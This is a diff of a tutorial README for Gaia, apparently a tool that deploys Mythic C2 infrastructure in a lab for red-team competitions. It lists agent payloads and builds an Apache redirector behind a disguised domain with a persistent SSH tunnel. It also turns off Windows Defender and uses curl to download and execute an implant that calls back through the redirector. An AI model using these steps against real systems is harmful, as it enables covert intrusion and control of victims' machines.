-{'payload_uuid': '0546277f-5184-4739-ace3-9a65e44661fa', 'payload_type': 'apollo', 'payload_file_name': 'notapollo.exe', 'payload_description': 'Windows x64 .NET Framework Portable Executable'}
-{'payload_uuid': 'ddd3e897-c4e5-45da-866e-c744f503e922', 'payload_type': 'apollo', 'payload_file_name': 'notapolloSvc.exe', 'payload_description': 'Windows x64 .NET Framework Service Executable'}
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia.py payload list
++--------------------------------------+----------+------------------+------------------------------------------------+
+|                 UUID                 |  Agent   |    File Name     |                  Description                   |
++--------------------------------------+----------+------------------+------------------------------------------------+
+| 1e54e884-418c-4f01-866b-4c4ccf6a0a02 | poseidon |   notposeidon    |             Linux arm64 Static ELF             |
+| a6e7d3be-78b5-4417-ba02-0c9f2dc6ef28 | poseidon |   notposeidon    |              Linux x64 Static ELF              |
+| 4fa5bf4f-2a53-4caa-9473-f82022d3e5db |  apollo  |  notapollo.exe   | Windows x64 .NET Framework Portable Executable |
+| fa299fbe-5867-44da-9763-bde09b584174 |  apollo  | notapolloSvc.exe | Windows x64 .NET Framework Service Executable  |
+| 26675a28-e58f-4669-8594-ea44227d5bee |  apollo  |  notapollo.bin   |             Windows x64 Shellcode              |
++--------------------------------------+----------+------------------+------------------------------------------------+
 ```
 
 Next, we use the UUID to generate the `mod_rewrite` file. This uses Mythic's built in ability to generate `mod_rewrite` rules based on [@threatexpress](https://github.com/threatexpress)'s [mythic2modrewrite](https://github.com/threatexpress/mythic2modrewrite) project. Note that you must specify the protocol handler, else it will redirect to another file on disk. Ask me how I know 🙃.
 ```
-(.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py redirector generate -u 0546277f-5184-4739-ace3-9a65e44661fa -t https://www.google.com -rS www.thislookslegit.net -ru admin -ri C:\\users\\shad\\.ssh\\gaia-redir.pem
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia.py redirector generate -u 4fa5bf4f-2a53-4caa-9473-f82022d3e5db -t https://www.google.com -rS www.thislookslegit.net -ri C:\users\winterknight\.ssh\gaia-redir.pem
 Generating base redirector rules.
 Modifying redirector rules to ensure they work with given parameters.
 Saving redirector rules on disk as .htaccess.
@@ -458,8 +590,8 @@ RewriteRule ^.*$ "https://www.google.com" [L,R=302]
 ## Connect Redirector to the Mythic Server
 If you go to the website that the redirector hosts now, you'll notice you wind up on Google instead. Awesome. Almost done! Time to build out the SSH tunnel, then fire that payload. Which means reading more docs.
 ```
-(.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py redirector tunnel -h
-usage: gaia redirector tunnel [-h] -mS  [-mP ] -mu  [-mp ] [-mi path/to/file] -rS  -ru
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia.py redirector tunnel -h
+usage: gaia redirector tunnel [-h] -mS  [-mP ] -mu  [-mp ] [-mi path/to/file] [-rS ] [-ru ]
 
 options:
   -h, --help                                    show this help message and exit
@@ -474,7 +606,7 @@ options:
 
 Now, to build the tunnel. Gaia creates a systemd service that wraps `autossh`. This allows the SSH tunnel to persist even after we disconnect from the Mythic server after creating the tunnel. This also allows some method of self-healing if the tunnel were to go down. Furthermore, this SSH tunnel is a bit weird. It's not a normal remote admin SSH tunnel, but instead redirects ports and doesn't provide any user a shell. It just proxies traffic from the redirector on port 8443 to port 80 on the Mythic server. If you want to learn more about SSH and how awesome it is, I highly recommend Graham Helton's [blog post](https://grahamhelton.com/blog/ssh-cheatsheet) on it.
 ```
-(.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py redirector tunnel -mS 192.168.153.133 -mu winterknight -rS www.thislookslegit.net -ru admin
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia.py redirector tunnel -mS 192.168.153.133 -mu winterknight -rS www.thislookslegit.net -ru admin
 Connecting to Mythic server.
 Copying Gaia-created SSH key for redirector to Mythic server.
 Creating systemd service file to build SSH tunnel on redirector.
@@ -484,22 +616,43 @@ Copying finished systemd service file to Mythic server, enabling the new service
 SSH tunnel and service successfully created!
 ```
 
+Last step before executing the payload and testing the end to end chain. I'm going to set up a Discord webhook for notifications. First, lets make sure there aren't any configured.
+```
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia.py operation webhook list
+Current webhook URL for Operation Chimera is 'None'
+```
+
+Let's configure the webhook for Discord in `Operation Chimera`, the default operation for `mythic_admin`.
+```
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia.py operation webhook config discord -u https://discord.com/api/webhooks/<server_id>/<string>
+```
+
+Once Mythic receives your webhook, you will see a message like this in Discord. More information on Discord webhooks at their documentation [here](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks).
+
+![Discord Webhook Received](readme_images/discord_webhook_init.png)
+
 ## Payload Test
 Time to test the payload! Since Apollo is *not evasive*, we will first need to turn off Windows Defender.
+
 ![Disabling Defender](readme_images/defender_gone.png)
 
 
 Then we will download and execute Apollo onto our Windows workstation and see that it works! 
 ```
-PS C:\tools> curl.exe -k https://192.168.153.133:7443/direct/download/b7256efe-8741-4bc2-ae08-f0e08917cfa6 -o apollo.exe
+PS C:\tools> curl.exe -k https://192.168.153.133:7443/direct/download/e716bb8c-360b-4574-9bb4-f01007689c21 -o notapollo.exe
   % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                  Dload  Upload  Total   Spent   Left   Speed
-100  1.68M 100  1.68M   0      0 48.38M      0                              0
-PS C:\tools> .\apollo.exe
+100  1.68M 100  1.68M   0      0 44.12M      0                              0
+PS C:\tools> .\notapollo.exe
 ```
 
 And if you did it all correctly, you should see a callback going through the redirector! 
+
 ![Callbacks with Apollo going through Redirector](readme_images/apollo_callback.png)
+
+You should also see a message in your webhook channel in Discord.
+
+![Discord webhook notification for new callback](readme_images/discord_webhook_callback.png)
 
 # Tearin' it down!
 For CCDC, this is more or less where infrastructure stops. However, we don't want to rack up AWS charges all day, so lets take the infrastructure down. First thing we will have to do is stop payload execution either by using `CTRL+C` or Task Manager. 
@@ -507,7 +660,7 @@ For CCDC, this is more or less where infrastructure stops. However, we don't wan
 ## Tearing down Redirectors
 Once that's done, we will delete the EC2 and it's associated components. Gaia identifies components to delete using those `createdBy:gaia` tags I mentioned when we spun up the redirector. It searches for EC2 Keypairs, Security Groups, and Instances with those tags before deleting them.
 ```
-(.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py redirector delete aws
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia.py redirector delete aws
 Getting Gaia EC2s from AWS
 Getting Gaia SSH keys from AWS.
 Getting Gaia Security Groups from AWS.
@@ -523,27 +676,27 @@ If you check your AWS console, you'll notice that the EC2 is gone, along with th
 ## Deleting DNS records
 Next up, deleting the A record we created earlier. Despite the resource that backed it being gone, it used a public IP address from AWS. At some point, another EC2 could spin up and take the IP, effectively hijacking the domain. This is a way to perform a subdomain takeover. 
 ```
-(.venv) PS C:\tools\gaia_guide\Gaia> .\gaia.py dns porkbun delete -d thislookslegit.net -n www
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia.py dns porkbun delete -d thislookslegit.net -n www
 Successfully deleted specified domain record.
 ```
 
 Now we double check that we removed all the records properly.
 ```
-./gaia.py dns porkbun list --domain thislookslegit.net
-Name: www.thislookslegit.net  Type: A  Value: 13.59.54.21
-Name: thislookslegit.net  Type: MX  Value: fwd1.porkbun.com
-Name: thislookslegit.net  Type: MX  Value: fwd2.porkbun.com
-Name: thislookslegit.net  Type: NS  Value: curitiba.porkbun.com
-Name: thislookslegit.net  Type: NS  Value: fortaleza.porkbun.com
-Name: thislookslegit.net  Type: NS  Value: maceio.porkbun.com
-Name: thislookslegit.net  Type: NS  Value: salvador.porkbun.com
-Name: thislookslegit.net  Type: TXT  Value: v=spf1 include:_spf.porkbun.com ~al
+(.venv) PS C:\tools\gaia_guide\Gaia> ./gaia.py dns porkbun list -d thislookslegit.net
++--------------------+-------------+--------------------------------------+-----------+
+|    Record Name     | Record Type |             Record Value             | Record ID |
++--------------------+-------------+--------------------------------------+-----------+
+| thislookslegit.net |      MX     |           fwd1.porkbun.com           | 558796414 |
+| thislookslegit.net |      MX     |           fwd2.porkbun.com           | 558796415 |
+| thislookslegit.net |      NS     |         curitiba.porkbun.com         | 558796413 |
+| thislookslegit.net |      NS     |        fortaleza.porkbun.com         | 558796412 |
+| thislookslegit.net |      NS     |          maceio.porkbun.com          | 558796410 |
+| thislookslegit.net |      NS     |         salvador.porkbun.com         | 558796411 |
+| thislookslegit.net |     TXT     | v=spf1 include:_spf.porkbun.com ~all | 558796416 |
++--------------------+-------------+--------------------------------------+-----------+
 ```
-Here's the view from the web app.
-
-![Porkbun domains after deletion](readme_images/porkbun_after_delete.png)
 
 ## Dealing with the Mythic Server
 At this point, feel free to revert the Mythic server to a VM image to a snapshot from before you installed Mythic, or delete the VM. If you are running on bare-metal, you can delete the docker containers if you wish. The way I use Gaia is by reverting the VM back to just after installation. 
 
-Thanks for checking Gaia out! I hope it and this guide helps you better understand how C2s work, and help you come up with strategies to counter them in the wild.
+Thanks for checking Gaia out! I hope it and this guide helps you better understand how to deploy Mythic so you can use it to better understand how C2s work. Hopefully some of you come up with strategies to counter C2s when you see them in the wild.
